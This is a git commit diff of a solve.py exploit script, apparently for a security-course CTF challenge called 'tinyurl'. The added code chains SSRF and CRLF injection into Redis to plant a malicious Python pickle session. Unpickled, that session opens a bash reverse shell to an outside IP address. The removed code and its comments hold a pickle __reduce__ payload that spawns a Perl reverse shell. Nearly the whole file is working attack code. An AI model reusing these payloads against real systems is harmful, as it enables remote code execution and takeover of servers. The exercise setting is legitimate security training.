4157a56d7f8cee1f6b12cbe00965af424bff284f
Alfons0329 <alfons.cs04@g2.nctu.edu.tw>
2019-11-30 01:58:30 +0800

    Commit some tinyurl requirements

--- Hw0x06/tinyurl/solve.py
+++ Hw0x06/tinyurl/solve.py
@@ -3,30 +3,31 @@ import urllib, requests, socket
 import os
 import pickle, redis
 
-class exp(object):
-    def __reduce__(self):
-        s = """perl -e 'use Socket;$i="127.0.0.1";$p=10163;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'"""
+url_post = 'http://redis:6379/?q=HTTP/1.1%0D%0ASET "session:8b84b3c7-34eb-4fcf-ab79-3ae9e44f52ee" "\x80\x03cposix\nsystem\nq\x00X5\x00\x00\x00"%0D%0AHeader2: THIS_IS_MY_HEADER_2%0D%0A'
 
-        return (os.system, (s,))
+print(url_post)
+r = requests.post('https://localhost:10163', data={'url': url_post}, verify=False)
+print(r.status_code, r.text)
+requests.get(r.text, verify=False)
 
-e = exp()
-s = pickle.dumps(e)
+url_post = 'http://redis:6379/?q=HTTP/1.1%0D%0AAPPEND "session:8b84b3c7-34eb-4fcf-ab79-3ae9e44f52ee" "bash -c \'bash -i >& "%0D%0AHeader2: THIS_IS_MY_HEADER_2%0D%0A'
 
-print('Deserialized -->%s<--' %(s))
-exit(0)
-r = redis.Redis(host='127.0.0.1', port=10163, db=0)
-# r.set("e6c36e69a9cf9543243d7921aa1a3d8093b49441", s)
-r.set("6d26c261bd004c9fa89f55314f240a3f", s)
+print(url_post)
+r = requests.post('https://localhost:10163', data={'url': url_post}, verify=False)
+print(r.status_code, r.text)
+requests.get(r.text, verify=False)
 
-# for the injection payload
-'''
-"session:6d26c261-bd00-4c9f-a89f-55314f240a3f"
+url_post = 'http://redis:6379/?q=HTTP/1.1%0D%0APPEND "session:8b84b3c7-34eb-4fcf-ab79-3ae9e44f52ee" "/dev/tcp/140.112.90.24/9527 0>&1\'"%0D%0AHeader2: THIS_IS_MY_HEADER_2%0D%0A'
+print(url_post)
+r = requests.post('https://localhost:10163', data={'url': url_post}, verify=False)
+print(r.status_code, r.text)
+requests.get(r.text, verify=False)
 
-set for
+url_post = 'http://redis:6379/?q=HTTP/1.1%0D%0AAPPEND "session:8b84b3c7-34eb-4fcf-ab79-3ae9e44f52ee" "q\x01\x85q\x02Rq\x03."%0D%0AHeader2: THIS_IS_MY_HEADER_2%0D%0A'
+print(url_post)
+r = requests.post('https://localhost:10163', data={'url': url_post}, verify=False)
+print(r.status_code, r.text)
+requests.get(r.text, verify=False)
+# url_post = 'http://redis:6379/?q=HTTP/1.1%0D%0ASET "session:1726804f-bcf3-4101-9d2b-22365652097d" "\x80\x03cposix\nsystem\nq\x00X5\x00\x00\x00bash -c \'bash -i >& /dev/tcp/140.112.90.24/9527 0>&1\'q\x01\x85q\x02Rq\x03."%0D%0AHeader2: THIS_IS_MY_HEADER_2%0D%0A'
 
-b'\x80\x03cposix\nsystem\nq\x00X\xdb\x00\x00\x00perl -e \'use Socket;$i="redis";$p=6379;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'q\x01\x85q\x02Rq\x03.'
-
-set "session:6d26c261-bd00-4c9f-a89f-55314f240a3f" b'\x80\x03cposix\nsystem\nq\x00X\xdb\x00\x00\x00perl -e \'use Socket;$i="140.112.90.24";$p=23333;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'q\x01\x85q\x02Rq\x03.'
-
---> url=http://redis:6379/?q=HTTP/1.1%0d%0aset "session:6d26c261-bd00-4c9f-a89f-55314f240a3f" b'\x80\x03cposix\nsystem\nq\x00X\xdb\x00\x00\x00perl -e \'use Socket;$i="140.112.90.24";$p=23333;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'q\x01\x85q\x02Rq\x03.'%0d%0a
-'''
+# url_post = 'http://redis:6379/?q=HTTP/1.1%0D%0ASET "session:057a0c8f-f743-4b1b-88ef-838e76c07408" GGGGGGGGGGGGGGGG%0D%0AHeader2: THIS_IS_MY_HEADER_2%0D%0A'
